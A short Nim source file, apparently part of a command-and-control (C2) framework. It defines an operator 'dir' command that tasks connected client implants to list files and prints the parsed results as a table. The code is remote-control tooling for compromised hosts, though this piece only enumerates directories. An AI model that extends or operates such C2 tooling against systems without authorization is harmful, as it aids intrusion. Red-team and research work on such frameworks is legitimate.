import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    
    var task = await client.sendClientTask("dir", args)
    
    if not task.isNil(): 
      await task.awaitResponse()

      let parser = initParser()
      parser.setBuffer(cast[seq[byte]](task.output.data))
      
      var files: seq[tuple[fileType: string, fileName: string]] = @[]

      for _ in 1..(parser.extractInt32()):
        files.add (
          fileType: if parser.extractBool(): "Directory" else: "File",
          fileName: parser.extractString()
        )
      
      printTable(toJson files)
      # infoLog task.output.data, false

let cmd*: Command = Command(
  execProc: execProc,
  name: "dir",
  argsLength: 0,
  usage: @["dir"],
  cliMode: @[ClientInteractMode],
  description: "List files in current directory",
  category: CCClientInteraction,
  requiresConnectedClient: true
)